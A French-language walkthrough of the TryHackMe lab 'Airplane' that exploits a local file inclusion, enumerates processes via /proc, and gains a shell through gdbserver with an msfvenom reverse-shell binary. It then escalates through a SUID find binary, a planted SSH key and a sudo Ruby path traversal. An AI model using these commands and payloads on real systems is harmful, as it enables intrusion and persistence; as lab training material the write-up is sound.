---
date: 2024-12-11T17:41:30-06:00
# description: ""
image: "/images/THM-Airplane/Airplane.svg"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Airplane"
type: "post"
---

* Platforme: TryHackMe
* Lien: [Airplane](https://tryhackme.com/r/room/airplane)
* Niveau: Moyen
* OS: Linux
---

Airplane débute par la découverte d'une vulnérabilité de type Local File Inclusion (LFI). En l'exploitant, nous énumérons les processus en cours d'exécution sur la cible et identifions un processus lié à `GdbServer`. Grâce à un binaire ELF conçu avec msfvenom, nous exploitons cet outil pour obtenir un accès initial au système. Une énumération plus approfondie révèle un binaire avec le bit SUID activé, ce qui nous permet de pivoter vers un autre compte et de récupérer le drapeau utilisateur. Nous accédons ensuite au système via SSH en tant que ce nouvel utilisateur et découvrons la permission d'exécuter des scripts Ruby en tant que root. En créant et en exécutant notre propre script Ruby, nous élevons nos privilèges et obtenons l'accès au compte root.

## Balayage

```
./nmap_scan.sh 10.10.14.32 Airplane
```

**Résultats**

```shell
Running detailed scan on open ports: 22,6048,8000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-11 17:48 CST
Nmap scan report for 10.10.14.32
Host is up (0.21s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
6048/tcp open  x11?
8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Wed, 11 Dec 2024 23:48:23 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Wed, 11 Dec 2024 23:48:17 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 269
|     Location: http://airplane.thm:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://airplane.thm:8000/?page=index.html">http://airplane.thm:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=12/11%Time=675A24C2%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,1F3,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0
SF:\.2\x20Python/3\.8\.10\r\nDate:\x20Wed,\x2011\x20Dec\x202024\x2023:48:1
SF:7\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Len
SF:gth:\x20269\r\nLocation:\x20http://airplane\.thm:8000/\?page=index\.htm
SF:l\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\
SF:n<title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x
SF:20should\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x2
SF:0URL:\x20<a\x20href=\"http://airplane\.thm:8000/\?page=index\.html\">ht
SF:tp://airplane\.thm:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click
SF:\x20the\x20link\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\
SF:x20FOUND\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.8\.10\r\nDate:\x20
SF:Wed,\x2011\x20Dec\x202024\x2023:48:23\x20GMT\r\nContent-Type:\x20text/h
SF:tml;\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close
SF:\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Fou
SF:nd</title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x2
SF:0not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x
SF:20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\
SF:x20again\.</p>\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3
SF:C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http:/
SF:/www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x2
SF:0content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20
SF:\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\
SF:\x05\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BA
SF:D_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20meth
SF:od\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.28 seconds
```

Notre scan nmap trouve trois ports ouverts :
* 22 - SSH
* 6048 - nmap n'est pas en mesure de déterminer avec précision le service sur ce port
* 8000 - Un serveur web avec Python Werkzeug. Nous avons aussi une redirection vers `airplane.thm` que nous ajoutons au fichier `/etc/hosts`.

## Enumération

La navigation vers le site web nous conduit à `http://airplane.thm:8000/?page=index.html` où nous trouvons un site web avec diverses informations sur les avions. Nous notons également la présence de `?page=index.html`, ce qui pourrait indiquer une vulnérabilité LFI si les contrôles de sécurité sont insuffisants.

![Airplane website](/images/THM-Airplane/airplane_website.png)

Avec Burp, nous confirmons la présence de la vulnérabilité.

![LFI confirmed](/images/THM-Airplane/LFI_confirmed.png)

Nous pouvons lire le fichier `/etc/passwd` pour identifier les utilisateurs sur le système cible.

![user accounts](/images/THM-Airplane/users_list.png)

Ci-dessous se trouve le contenu complet du fichier `/etc/passwd`, nous remarquons deux comptes utilisateurs `carlos` et `hudson`.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

Les tentatives de lecture du fichier `user.txt` dans le dossier personnel de `carlos` ou `hudson` échouent. 

![carlos Home folder](/images/THM-Airplane/carlos_home_folder.png)

![hudson home fodler](/images/THM-Airplane/hudson_home_folder.png)

Nous continuons notre énumération et essayons de trouver des répertoires cachés avec gobuster.

![directory bruteforcing with Gobuster](/images/THM-Airplane/gobuster_cmd.png)

À `http://airplane.thm:8000/airplane`, nous trouvons une animation avec le message «Let's Fly», ce qui n'est probablement pas une voie d'exploitation viable. De plus, l'énumération des sous-domaines ne donne aucun résultat.

![airplane directory](/images/THM-Airplane/letsfly.png)

Nous pouvons exploiter la vulnérabilité LFI pour trouver des informations sur les processus existant sur la cible. Chaque processus en cours d'exécution sur un système Linux a un répertoire correspondant sous le répertoire `/proc`, et à l'intérieur de ce répertoire il y a un fichier nommé `cmdline`. 

Par exemple, `/proc/100/cmdline` contiendra les arguments de la ligne de commande qui ont été utilisés pour démarrer le processus avec le PID `100`. Ces fichiers peuvent contenir des informations sensibles telles que des mots de passe, des clés API, etc.

Afin d'énumérer les processus sur la cible, nous utilisons la fonction Intruder de Burp. Nous utilisons le payload `../../../../proc/x/cmdline` avec le symbole `§` autour du `x`. 

![payload in intruder](/images/THM-Airplane/payload_intruder.png)

Pour les paramètres du payload, nous sélectionnons `Numbers` allant séquentiellement de 1 à 10000 (vous pouvez choisir un nombre plus petit comme 1000) et démarrons l'attaque. En raison de la limite de vitesse de Burp CE, le processus prendra beaucoup de temps, mais nous pouvons continuer notre énumération au fur et à mesure que l'attaque progresse.

> Je recommande d'utiliser [Caido](https://caido.io/) pour ce type d'attaque car il n'y a pas de limitation de vitesse.

Après avoir classé les requêtes par longueur, vous trouverez une requête dont la réponse est `/usr/bin/gdbserver0.0.0.0:6048airplane`. (La requête spécifique se trouve toujours parmi celles qui ont une longueur d'environ 400 octets).

![gdbserver process](/images/THM-Airplane/gdbserver.png)

## Accès initial (shell en tant que hudson)

En recherchant `gdbserver reverse shell` sur Google, nous trouvons [cette page HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver) expliquant comment exploiter cet outil. Suivons les étapes :

1. Créer un binaire ELF

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=PORT PrependFork=true -f elf -o binary.elf
```

![elf backdoor](/images/THM-Airplane/elf_backdoor.png)

2. Rendre le fichier exécutable

```
chmod +x binary.elf
```

3. Lancer GDB pour débugger le fichier

```
gdb binary.elf
```

![Open the elf with GDB](/images/THM-Airplane/gdb_elf.png)

4. Définir la cible du debugger

```
target extended-remote airplane.thm:6048
```

![Set the remote target](/images/THM-Airplane/elf_target_set.png)

5. Télécharger le fichier ELF sur la cible

```
remote put binary.elf /tmp/binary.elf
```

![elf backdoor upload](/images/THM-Airplane/elf_upload.png)

6. Définir le fichier exécutable

```
set remote exec-file /tmp/binary.elf
```

7. Exécuter le fichier sur la cible

> Assurez-vous que votre listener est configuré sur le numéro de port choisi à l'étape 1.

```
run
y
```

![Reverse shell executed](/images/THM-Airplane/revshell_executed.png)

Sur le listener, nous recevons une connexion en tant que `hudson`.

![Foothold](/images/THM-Airplane/foothold.png)

Nous améliorons notre shell avec les commandes suivantes

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

![Shell Upgrade](/images/THM-Airplane/shell_upgrade.png)

Le drapeau utilisateur n'est pas sur ce compte, nous devons donc accéder au deuxième compte. 

### Mouvement latéral (shell en tant que carlos)

Nous exécutons linpeas et constatons que `/usr/bin/find` a le bit SUID défini et qu'il appartient à `carlos`.

![find binary with SUID bit set](/images/THM-Airplane/find_binary.png)

Sur [GTFObins](https://gtfobins.github.io/gtfobins/find/), nous trouvons un payload permettant d'élever nos privilèges et le drapeau utilisateur est dans `/home/carlos`.

```
/usr/bin/find . -exec /bin/bash -p \; -quit
```

![user flag](/images/THM-Airplane/user_flag.png)

Avec `ls -la` nous observons le répertoire `.ssh`. Nous pouvons ajouter une clé ssh à `/home/carlos/.ssh/authorized_keys` pour être en mesure de se connecter via SSH en tant que `carlos`.

Nous générons une paire de clés avec 

```
ssh-keygen -t rsa -b 2048 -f carlos
```

![SSH keygen](/images/THM-Airplane/keygen_carlos.png)

Nous stockons le contenu de `carlos.pub` dans `/home/carlos/.ssh/authorized_keys` à l'aide de

```
echo 'CONTENT OF carlos.pub' > /home/carlos/.ssh/authorized_keys

chmod 600 /home/carlos/.ssh/authorized_keys
```

![SSH setup](/images/THM-Airplane/SSH_setup.png)

Sur notre machine locale, nous nous connectons sous le nom de Carlos avec 

```
ssh -i carlos carlos@airplane.thm
```

![SSH login as carlos](/images/THM-Airplane/shh_login_carlos.png)

## Elévation de Privilèges

Avec `sudo -l` nous apprenons que `carlos` est autorisé à exécuter n'importe quel script Ruby situé dans `/root` en tant que root sans fournir de mot de passe.

![sudo -l command](/images/THM-Airplane/sudo-l.png)

Il est facile d'en abuser en créant notre propre fichier ruby contenant une commande pour lancer un shell. De plus, grâce au caractère `*`, nous pouvons exécuter notre fichier même s'il se trouve en dehors de `/root`.

```
echo 'exec "/bin/sh"' > root.rb

sudo /usr/bin/ruby /root/../home/carlos/root.rb
```

Après avoir exécuté les deux commandes ci-dessus, nous obtenons l'accès au compte root et nous pouvons lire le fichier `root.txt`.

![root flag](/images/THM-Airplane/root_flag.png)

Merci d'avoir pris le temps de lire cet article, j'espère qu'il vous a été utile.
